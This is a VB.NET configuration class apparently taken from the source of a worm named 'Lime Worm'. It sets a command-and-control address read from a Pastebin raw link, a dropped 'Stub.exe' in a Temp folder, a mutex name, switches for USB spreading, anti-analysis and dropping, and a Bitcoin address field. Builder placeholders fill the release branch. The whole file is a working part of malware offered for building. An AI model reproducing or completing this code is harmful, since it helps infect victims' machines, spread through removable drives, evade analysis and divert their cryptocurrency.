Public Class Settings

    'For testing use debug compiler

#If DEBUG Then
    Public Shared Pastebin As String = "https://pastebin.com/raw/DDTVwwbu" ' IP:PORT
    Public Shared HOST As String
    Public Shared PORT As Integer
    Public Shared EXE As String = "Stub.exe"
    Public Shared NMT As Threading.Mutex = Nothing
    Public Shared MTX As String = "_Lime_Worm_"
    Public Shared USB As Boolean = False
    Public Shared ANTI As Boolean = False
    Public Shared DROP As Boolean = False
    Public Shared PATH1 As String = "Temp"
    Public Shared PATH2 As String = "Lime"
    Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
    Public Shared BTC_ADDR As String = "THIS IS YOUR BTC 1234567890"
#Else
    Public Shared Pastebin As String = "%Pastebin%"
    Public Shared HOST As String 
    Public Shared PORT As Integer
    Public Shared EXE As String = "%EXE%"
    Public Shared NMT As Threading.Mutex = Nothing
    Public Shared MTX As String = "_Lime_Worm_"
    Public Shared USB As Boolean = "%USB%"
    Public Shared ANTI As Boolean = "%ANTI%"
    Public Shared DROP As Boolean = "%DROP%"
    Public Shared PATH1 As String = "%PATH1%"
    Public Shared PATH2 As String = "%PATH2%"
    Public Shared NEXE As Object = New IO.FileInfo(Application.ExecutablePath)
    Public Shared fullpath = Interaction.Environ(PATH1) & "\" & PATH2 & "\" & EXE
    Public Shared BTC_ADDR As String = "%BTC_ADDR%"
#End If

End Class
